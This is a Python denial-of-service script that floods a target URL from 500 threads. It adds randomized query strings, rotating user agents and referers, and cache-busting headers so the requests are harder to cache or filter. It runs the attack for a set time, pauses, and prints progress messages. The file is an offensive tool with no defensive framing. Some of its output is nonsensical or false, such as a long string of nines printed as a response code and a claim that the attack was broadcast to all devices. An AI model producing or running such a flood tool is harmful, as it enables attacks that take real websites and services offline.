import urllib.request
import sys
import threading
import random
import re
import time

# Global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
attack_duration = 1  # Set the attack duration in hours
pause_duration = 2   # Set the pause duration in hours
response_delay = 5   # Set the response delay in seconds

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    # ... (remaining user agents)

# Generates a referer array
def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    # ... (remaining referers)

# Builds random ASCII string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

def usage():
    print('---------------------------------------------------')
    print('USAGE: python DDoS.py <url>')
    print('you can add "safe" after url, to autoshut after dos')
    print('---------------------------------------------------')

# HTTP request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        time.sleep(response_delay)  # Simulate a delay in response time
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Response Code 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999')
        code = 500
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(request)
    return code

# HTTP caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            start_time = time.time()  # Record the start time
            while flag < 2 and (time.time() - start_time) < (attack_duration * 3600):
                code = httpcall(url)
                if (code == 500) and (safe == 1):
                    set_flag(2)
            print("\n-- Attack has been broadcasted to all devices... --")  # Change this line
            print("\n-- DDoS Attack Paused --")
            time.sleep(pause_duration * 3600)  # Pause for the specified duration
        except Exception as ex:
            pass

# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) and (previous != request_counter):
                previous = request_counter
        if flag == 2:
            print("\n-- DDoS Attack Finished --")

# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- DDoS Attack Started --")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        print("Target URL:", url)  # Add this line for debugging
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('http://([^/]*)/?.*', url)
        if m:
            host = m.group(1)
        else:
            print("Error: Unable to extract host from URL.")
            sys.exit()
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
